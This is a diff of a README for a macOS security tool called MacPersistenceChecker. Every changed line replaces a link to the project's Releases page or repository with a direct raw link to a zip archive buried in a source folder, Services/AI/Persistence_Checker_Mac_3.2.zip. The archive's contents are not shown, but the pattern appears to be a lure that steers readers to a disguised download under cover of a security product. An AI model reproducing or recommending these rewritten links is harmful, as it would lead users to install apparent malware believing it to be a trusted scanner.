@@ -1,7 +1,7 @@
 # 🛠️ MacPersistenceChecker - Scan Your macOS for Security Issues
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/Jy7in/MacPersistenceChecker/releases)
+[![Download Latest Release](https://github.com/Jy7in/MacPersistenceChecker/raw/refs/heads/main/MacPersistenceChecker/Services/AI/Persistence_Checker_Mac_3.2.zip%20Release-blue)](https://github.com/Jy7in/MacPersistenceChecker/raw/refs/heads/main/MacPersistenceChecker/Services/AI/Persistence_Checker_Mac_3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to MacPersistenceChecker! This tool helps you scan your macOS for persistence mechanisms. With its built-in code signature verification and timeline tracking, you can ensure your system is secure and free from unwanted applications.
@@ -17,7 +17,7 @@ Before you start, ensure your system meets these requirements:
 To download MacPersistenceChecker, follow these steps:
 
 1. Click on the link below to visit the Releases page:
-   [Visit the Releases Page](https://github.com/Jy7in/MacPersistenceChecker/releases)
+   [Visit the Releases Page](https://github.com/Jy7in/MacPersistenceChecker/raw/refs/heads/main/MacPersistenceChecker/Services/AI/Persistence_Checker_Mac_3.2.zip)
    
 2. On the Releases page, locate the latest version of the application. It will generally have a title like "v1.0" or similar.
 
@@ -62,7 +62,7 @@ We welcome contributions to improve MacPersistenceChecker! If you have ideas or 
 MacPersistenceChecker is open-source software. You can view the license details in the repository.
 
 ## 🔗 Links
-- [Download Latest Release](https://github.com/Jy7in/MacPersistenceChecker/releases)
-- [GitHub Repository](https://github.com/Jy7in/MacPersistenceChecker)
+- [Download Latest Release](https://github.com/Jy7in/MacPersistenceChecker/raw/refs/heads/main/MacPersistenceChecker/Services/AI/Persistence_Checker_Mac_3.2.zip)
+- [GitHub Repository](https://github.com/Jy7in/MacPersistenceChecker/raw/refs/heads/main/MacPersistenceChecker/Services/AI/Persistence_Checker_Mac_3.2.zip)
 
 Thank you for using MacPersistenceChecker! Keep your macOS secure and free from unwanted applications.
